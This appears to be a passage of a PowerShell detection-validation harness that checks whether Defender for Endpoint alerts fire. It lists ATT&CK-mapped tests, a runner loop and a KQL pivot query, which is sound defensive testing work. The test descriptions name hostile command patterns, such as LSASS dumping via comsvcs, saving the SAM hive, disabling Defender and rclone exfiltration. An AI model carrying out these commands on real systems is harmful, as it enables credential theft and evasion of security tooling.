    [pscustomobject]@{ Id='SOC1059'; Func='Test-SOC1059'; Tactic='Execution'; Technique='T1105'; Kind='file'; Admin=$false; Description='Grouped common eCrime tool filenames written by one process' }
    [pscustomobject]@{ Id='SOC1048'; Func='Test-SOC1048'; Tactic='Defense Evasion'; Technique='T1562.001'; Kind='procchain'; Admin=$false; Description='Defender disabled via PowerShell (Set-MpPreference cmdline)' }
    [pscustomobject]@{ Id='SOC1143'; Func='Test-SOC1143'; Tactic='Defense Evasion'; Technique='T1562.001'; Kind='proc'; Admin=$false; Description='Defender/AV impairment (Add-MpPreference exclusion string)' }
    [pscustomobject]@{ Id='SOC1050'; Func='Test-SOC1050'; Tactic='Defense Evasion'; Technique='T1218.005'; Kind='echo'; Admin=$false; Description='MSHTA suspicious network cmdline (mshta + ://)' }
    [pscustomobject]@{ Id='SOC1154'; Func='Test-SOC1154'; Tactic='Defense Evasion'; Technique='T1218.005'; Kind='proc'; Admin=$false; Description='MSHTA executing inline script (javascript: self-close)' }
    [pscustomobject]@{ Id='SOC1155'; Func='Test-SOC1155'; Tactic='Defense Evasion'; Technique='T1218.005'; Kind='procchain'; Admin=$false; Description='MSHTA suspicious parent (cmd.exe -> mshta.exe self-close HTA)' }
    [pscustomobject]@{ Id='SOC1118'; Func='Test-SOC1118'; Tactic='Defense Evasion'; Technique='T1202'; Kind='echo'; Admin=$false; Description='Forfiles abuse cmdline (forfiles+cmd+start+mshta+://)' }
    [pscustomobject]@{ Id='SOC1093'; Func='Test-SOC1093'; Tactic='Execution'; Technique='T1059.003'; Kind='proc'; Admin=$false; Description='ClickFix DNS variant (nslookup inside for/findstr loop)' }
    [pscustomobject]@{ Id='SOC1114'; Func='Test-SOC1114'; Tactic='Command and Control'; Technique='T1105'; Kind='echo'; Admin=$false; Description='Finger.exe LOLBin cmdline (finger + | + @)' }
    [pscustomobject]@{ Id='SOC1055'; Func='Test-SOC1055'; Tactic='Defense Evasion'; Technique='T1556'; Kind='echo'; Admin=$false; Description='Duo MFA fail-open cmdline (echo api- duosecurity.com 127.0.0.1)' }
    [pscustomobject]@{ Id='SOC1094'; Func='Test-SOC1094'; Tactic='Credential Access'; Technique='T1552.002'; Kind='echo'; Admin=$false; Description='Password harvesting from registry (reg query cmdline)' }
    [pscustomobject]@{ Id='SOC1043'; Func='Test-SOC1043'; Tactic='Credential Access'; Technique='T1003.002'; Kind='echo'; Admin=$false; Description='Sensitive hive save cmdline (reg save HKLM\SAM)' }
    [pscustomobject]@{ Id='SOC1051'; Func='Test-SOC1051'; Tactic='Credential Access'; Technique='T1003.001'; Kind='echo'; Admin=$false; Description='LSASS dumping cmdline signature (comsvcs/procdump strings)' }
    [pscustomobject]@{ Id='SOC1096'; Func='Test-SOC1096'; Tactic='Execution'; Technique='T1059.001'; Kind='echo'; Admin=$false; Description='PowerShell Empire path signature' }
    [pscustomobject]@{ Id='SOC1097'; Func='Test-SOC1097'; Tactic='Discovery'; Technique='T1082'; Kind='echo'; Admin=$false; Description='PrivescCheck execution signature' }
    [pscustomobject]@{ Id='SOC1036'; Func='Test-SOC1036'; Tactic='Privilege Escalation'; Technique='T1546.008'; Kind='echo'; Admin=$false; Description='Narrator/accessibility abuse cmdline signature' }
    [pscustomobject]@{ Id='SOC1024'; Func='Test-SOC1024'; Tactic='Execution'; Technique='T1059'; Kind='echo'; Admin=$false; Description='Known-adversary TTP cmdline (net user CtxAppVCOMService / sc start AppMgmt)' }
    [pscustomobject]@{ Id='SOC1006'; Func='Test-SOC1006'; Tactic='Exfiltration'; Technique='T1048'; Kind='curl'; Admin=$false; Description='Exfiltration via curl (--upload-file to local file:// - no egress)' }
    [pscustomobject]@{ Id='SOC1140'; Func='Test-SOC1140'; Tactic='Command and Control'; Technique='T1197'; Kind='proc'; Admin=$false; Description='PowerShell BITS transfer cmdline (Start-BitsTransfer + https, string only)' }
    [pscustomobject]@{ Id='SOC1141'; Func='Test-SOC1141'; Tactic='Command and Control'; Technique='T1197'; Kind='proc'; Admin=$false; Description='BitsAdmin external transfer (bitsadmin /transfer /download https)' }
    [pscustomobject]@{ Id='SOC1145'; Func='Test-SOC1145'; Tactic='Execution'; Technique='T1218.007'; Kind='proc'; Admin=$false; Description='MSIExec user-context remote file (UNC path, no external egress)' }
    [pscustomobject]@{ Id='SOC1146'; Func='Test-SOC1146'; Tactic='Defense Evasion'; Technique='T1218.007'; Kind='proc'; Admin=$false; Description='MSIExec DLL from user-writable dir (/y on non-existent DLL)' }
    [pscustomobject]@{ Id='SOC1128'; Func='Test-SOC1128'; Tactic='Defense Evasion'; Technique='T1059.001'; Kind='proc'; Admin=$false; Description='PowerShell downgrade to v2' }
    [pscustomobject]@{ Id='SOC1068'; Func='Test-SOC1068'; Tactic='Credential Access'; Technique='T1555'; Kind='proc'; Admin=$false; Description='Netsh WLAN profile key extraction (non-existent profile)' }
    [pscustomobject]@{ Id='SOC1158'; Func='Test-SOC1158'; Tactic='Defense Evasion'; Technique='T1112'; Kind='proc'; Admin=$false; Description='Registry manipulation via WMI (StdRegProv call, read-only)' }
    [pscustomobject]@{ Id='SOC1067'; Func='Test-SOC1067'; Tactic='Discovery'; Technique='T1007'; Kind='proc'; Admin=$false; Description='Unquoted service path enumeration (wmic + findstr chain, read-only)' }
    [pscustomobject]@{ Id='SOC1151'; Func='Test-SOC1151'; Tactic='Exfiltration'; Technique='T1567.002'; Kind='echo'; Admin=$false; Description='Rclone usage cmdline (rclone copy + --transfers)' }
    [pscustomobject]@{ Id='SOC1150'; Func='Test-SOC1150'; Tactic='Command and Control'; Technique='T1090'; Kind='echo'; Admin=$false; Description='Proxy configuration cmdline (socks5 / -D ip:port)' }
    [pscustomobject]@{ Id='SOC1126'; Func='Test-SOC1126'; Tactic='Execution'; Technique='T1059.001'; Kind='proc'; Admin=$false; Description='PowerShell XML download cradle (msxml + DownloadString string)' }
    [pscustomobject]@{ Id='SOC1101'; Func='Test-SOC1101'; Tactic='Execution'; Technique='T1059.001'; Kind='manual'; Admin=$false; Description='Obfuscated PowerShell by IIS worker (parent=w3wp.exe)' }
    [pscustomobject]@{ Id='SOC1102'; Func='Test-SOC1102'; Tactic='Execution'; Technique='T1505.003'; Kind='manual'; Admin=$false; Description='Suspicious commands under IIS worker (parent=w3wp.exe)' }
    [pscustomobject]@{ Id='SOC1103'; Func='Test-SOC1103'; Tactic='Persistence'; Technique='T1505.003'; Kind='manual'; Admin=$false; Description='Web shell deployment via IIS worker (cmd parent=w3wp)' }
    [pscustomobject]@{ Id='SOC1105'; Func='Test-SOC1105'; Tactic='Persistence'; Technique='T1505.003'; Kind='manual'; Admin=$false; Description='Compromised IIS (w3wp AppPool MSExchange -> shell)' }
    [pscustomobject]@{ Id='SOC1038'; Func='Test-SOC1038'; Tactic='Execution'; Technique='T1210'; Kind='manual'; Admin=$false; Description='WSUS RCE (parent=wsusservice.exe / w3wp.exe)' }
    [pscustomobject]@{ Id='SOC1014'; Func='Test-SOC1014'; Tactic='Lateral Movement'; Technique='T1021.002'; Kind='manual'; Admin=$false; Description='SmbExec command execution (parent=services.exe, SmbExec cmdline)' }
    [pscustomobject]@{ Id='SOC1018'; Func='Test-SOC1018'; Tactic='Lateral Movement'; Technique='T1047'; Kind='procchain'; Admin=$false; Description='WmiExec command execution (parent=WmiPrvSE via wmic process call create)' }
    [pscustomobject]@{ Id='SOC1011'; Func='Test-SOC1011'; Tactic='Lateral Movement'; Technique='T1053.002'; Kind='manual'; Admin=$true; Description='AtExec command execution (AccountName=system, parent has ''Schedule'')' }
    [pscustomobject]@{ Id='SOC1021'; Func='Test-SOC1021'; Tactic='Credential Access'; Technique='T1003.001'; Kind='manual'; Admin=$false; Description='Named pipe access indicating remote LSA theft (initiator=ntoskrnl.exe)' }
    [pscustomobject]@{ Id='SOC1020'; Func='Test-SOC1020'; Tactic='Credential Access'; Technique='T1003'; Kind='manual'; Admin=$false; Description='Credential theft via SecretsDump (NamedPipe+NTLM logon+RemoteRegistry)' }
    [pscustomobject]@{ Id='SOC1026'; Func='Test-SOC1026'; Tactic='Lateral Movement'; Technique='T1570'; Kind='manual'; Admin=$false; Description='PsExec local binary creation over ADMIN$ (initiator=ntoskrnl SMB)' }
    [pscustomobject]@{ Id='SOC1123'; Func='Test-SOC1123'; Tactic='Defense Evasion'; Technique='T1211'; Kind='manual'; Admin=$true; Description='RedSun suspicious file write to System32 (initiator=MsMpEng/SenseIR SYSTEM)' }
    [pscustomobject]@{ Id='SOC1032'; Func='Test-SOC1032'; Tactic='Command and Control'; Technique='T1219'; Kind='manual'; Admin=$false; Description='Atera RMM child process (parent version-info AgentPackageRunCommandInteractive)' }
    [pscustomobject]@{ Id='SOC1034'; Func='Test-SOC1034'; Tactic='Command and Control'; Technique='T1219'; Kind='manual'; Admin=$false; Description='DWService RMM child process (parent=dwagent/python version-info)' }
    [pscustomobject]@{ Id='SOC1035'; Func='Test-SOC1035'; Tactic='Command and Control'; Technique='T1219'; Kind='manual'; Admin=$false; Description='MeshAgent RMM child process (parent=MeshAgent + -b64exec)' }
    [pscustomobject]@{ Id='SOC1037'; Func='Test-SOC1037'; Tactic='Command and Control'; Technique='T1219'; Kind='manual'; Admin=$false; Description='ScreenConnect RMM child process (parent=ScreenConnect.ClientService)' }
    [pscustomobject]@{ Id='SOC1056'; Func='Test-SOC1056'; Tactic='Command and Control'; Technique='T1219'; Kind='manual'; Admin=$false; Description='SimpleHelp RMM child process (parent=SimpleService/SimpleHelp)' }
    [pscustomobject]@{ Id='SOC1112'; Func='Test-SOC1112'; Tactic='Command and Control'; Technique='T1219'; Kind='manual'; Admin=$false; Description='NetSupport from unusual directory (PE version-info netsupport/Crosstec)' }
    [pscustomobject]@{ Id='SOC1119'; Func='Test-SOC1119'; Tactic='Defense Evasion'; Technique='T1127.001'; Kind='msbuild'; Admin=$false; Description='MSBuild project executed from staging dir (real msbuild, empty project)' }
    [pscustomobject]@{ Id='SOC1120'; Func='Test-SOC1120'; Tactic='Defense Evasion'; Technique='T1055'; Kind='manual'; Admin=$false; Description='Process injection by MSBuild.exe (msbuild -> suspicious child, non-VS path)' }
    [pscustomobject]@{ Id='SOC1121'; Func='Test-SOC1121'; Tactic='Command and Control'; Technique='T1127'; Kind='net'; Admin=$false; Description='MSBuild.exe outbound connection to public IP' }
    [pscustomobject]@{ Id='SOC1065'; Func='Test-SOC1065'; Tactic='Command and Control'; Technique='T1071'; Kind='net'; Admin=$false; Description='Observation of .oast. domain (HoK / OOB interaction)' }
    [pscustomobject]@{ Id='SOC1138'; Func='Test-SOC1138'; Tactic='Command and Control'; Technique='T1572'; Kind='net'; Admin=$false; Description='Trycloudflare tunnel connection' }
    [pscustomobject]@{ Id='SOC1137'; Func='Test-SOC1137'; Tactic='Command and Control'; Technique='T1102'; Kind='net'; Admin=$false; Description='Ethereum / Arweave gateway connection' }
    [pscustomobject]@{ Id='SOC1030'; Func='Test-SOC1030'; Tactic='Command and Control'; Technique='T1071'; Kind='net'; Admin=$false; Description='Gootloader C2 (cscript initiating external connection)' }
    [pscustomobject]@{ Id='SOC1007'; Func='Test-SOC1007'; Tactic='Initial Access'; Technique='T1078'; Kind='logon'; Admin=$true; Description='Potential pentest (AccountName contains ''pentest'')' }
    [pscustomobject]@{ Id='SOC1054'; Func='Test-SOC1054'; Tactic='Discovery'; Technique='T1016'; Kind='proc'; Admin=$false; Description='Discovery commands after RDP (discovery leg only)' }
    [pscustomobject]@{ Id='SOC1129'; Func='Test-SOC1129'; Tactic='Defense Evasion'; Technique='T1564.001'; Kind='procchain'; Admin=$false; Description='Attrib.exe hiding a file in a staging dir (parent cmd -> attrib +h)' }
    [pscustomobject]@{ Id='SOC1095'; Func='Test-SOC1095'; Tactic='Credential Access'; Technique='T1552.001'; Kind='procchain'; Admin=$false; Description='Password search via findstr (parent powershell -> findstr /si password)' }
    [pscustomobject]@{ Id='SOC1008'; Func='Test-SOC1008'; Tactic='Execution'; Technique='T1059.007'; Kind='chain3'; Admin=$false; Description='Gootloader exec ancestry (wscript -> cmd -> cscript, .JS)' }
    [pscustomobject]@{ Id='SOC1115'; Func='Test-SOC1115'; Tactic='Execution'; Technique='T1059.001'; Kind='chain3b'; Admin=$false; Description='Suspicious cscript ancestry (cscript -> powershell -> powershell)' }
    [pscustomobject]@{ Id='SOC1117'; Func='Test-SOC1117'; Tactic='Execution'; Technique='T1059.007'; Kind='procchain'; Admin=$false; Description='Gootloader malformed ZIP (explorer -> wscript, .js in Temp)' }
    [pscustomobject]@{ Id='SOC1044'; Func='Test-SOC1044'; Tactic='Execution'; Technique='T1204'; Kind='procchain'; Admin=$false; Description='FileFix (explorer -> powershell with http/encoded param)' }
    [pscustomobject]@{ Id='SOC1062'; Func='Test-SOC1062'; Tactic='Execution'; Technique='T1204.002'; Kind='chain3c'; Admin=$false; Description='PhantomStealer (explorer -> powershell -> msiexec)' }
    [pscustomobject]@{ Id='SOC1063'; Func='Test-SOC1063'; Tactic='Execution'; Technique='T1059.007'; Kind='chain3d'; Admin=$false; Description='JSGuLdr (wscript .js -> explorer -> powershell)' }
    [pscustomobject]@{ Id='SOC1025'; Func='Test-SOC1025'; Tactic='Lateral Movement'; Technique='T1021.006'; Kind='winrm'; Admin=$false; Description='Process executed via WinRM (parent=wsmprovhost.exe)' }
    [pscustomobject]@{ Id='SOC1160'; Func='Test-SOC1160'; Tactic='Defense Evasion'; Technique='T1553.005'; Kind='isomount'; Admin=$true; Description='ISO file mount (MountedDevices reg + Recent .iso.lnk)' }
    [pscustomobject]@{ Id='SOC1098'; Func='Test-SOC1098'; Tactic='Execution'; Technique='T1059.004'; Kind='manual'; Admin=$false; Description='macOS ClickFix (zsh + base64)' }
)

if ($ListTests) {
    $AllTests | Select-Object Id, Tactic, Technique, Kind, Admin, Description | Format-Table -AutoSize | Out-String -Width 240 | Write-Host
    return
}

$run = $AllTests
if ($Only)    { $run = $run | Where-Object { $Only    -contains $_.Id } }
if ($Exclude) { $run = $run | Where-Object { $Exclude -notcontains $_.Id } }

$RunId = Initialize-AtrRun -RunId $RunId
Write-Host ""
Write-Host "  Benign Detection-Validation Harness" -ForegroundColor Cyan
Write-Host "  RunId : $RunId    Marker: ATRVAL_$RunId" -ForegroundColor Cyan
Write-Host "  Host  : $env:COMPUTERNAME   User: $env:USERNAME   Admin: $($Global:ATR.IsAdmin)" -ForegroundColor Cyan
Write-Host "  Start : $((Get-Date).ToUniversalTime().ToString('u'))  |  Tests: $($run.Count)" -ForegroundColor Cyan
if (-not $Global:ATR.IsAdmin) { Write-Host "  (not elevated - admin-only tests will SKIP)" -ForegroundColor Yellow }
Write-Host ("  " + ('-'*70)) -ForegroundColor DarkGray

foreach ($tst in $run) {
    if ($DryRun) {
        Write-Host ("  [DRY ] {0,-9} {1}" -f $tst.Id, $tst.Description) -ForegroundColor DarkGray
        continue
    }
    try {
        $res = & $tst.Func -IncludeNetwork:$IncludeNetwork -CanaryUrl $CanaryUrl
    } catch {
        $res = New-AtrResult $tst.Id $tst.Description $tst.Tactic $tst.Technique 'ERROR' $_.Exception.Message ("ATRVAL_"+$RunId)
    }
    $Global:ATR.Results.Add($res) | Out-Null
    $c = switch ($res.Status) {
        'RAN'    {'Green'}   'PARTIAL'{'Yellow'} 'MANUAL'{'DarkCyan'}
        'SKIP'   {'DarkGray'} default {'Red'} }
    Write-Host ("  [{0,-7}] {1,-9} {2}" -f $res.Status, $res.Id, $res.Description) -ForegroundColor $c
}

if (-not $DryRun) {
    Remove-AtrWorkDir
    Write-Host ("  " + ('-'*70)) -ForegroundColor DarkGray
    $g = $Global:ATR.Results | Group-Object Status | Sort-Object Name
    Write-Host "  Summary: " -NoNewline
    foreach ($grp in $g) { Write-Host ("{0}={1}  " -f $grp.Name,$grp.Count) -NoNewline }
    Write-Host ""
    $csv = Join-Path $env:TEMP ("ATRVAL_" + $RunId + "_results.csv")
    $Global:ATR.Results | Export-Csv -NoTypeInformation -Path $csv -Encoding UTF8
    Write-Host "  Results CSV: $csv" -ForegroundColor Green
    Write-Host "  End  : $((Get-Date).ToUniversalTime().ToString('u'))  |  allow 5-15 min for MDE ingestion." -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  Pivot query (paste RunId):" -ForegroundColor Cyan
    Write-Host @"
  let RunId = "$RunId";
  union DeviceProcessEvents, DeviceNetworkEvents, DeviceRegistryEvents, DeviceFileEvents, DeviceEvents, DeviceLogonEvents
  | where Timestamp > ago(2h)
  | where ProcessCommandLine has RunId or InitiatingProcessCommandLine has RunId
       or FileName has RunId or FolderPath has RunId or AdditionalFields has RunId
       or RegistryValueName has RunId or RegistryValueData has RunId or RemoteUrl has RunId
  | project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine,
            InitiatingProcessFileName, InitiatingProcessParentFileName, RegistryKey, RegistryValueData, RemoteUrl
  | order by Timestamp asc
"@ -ForegroundColor Gray
}
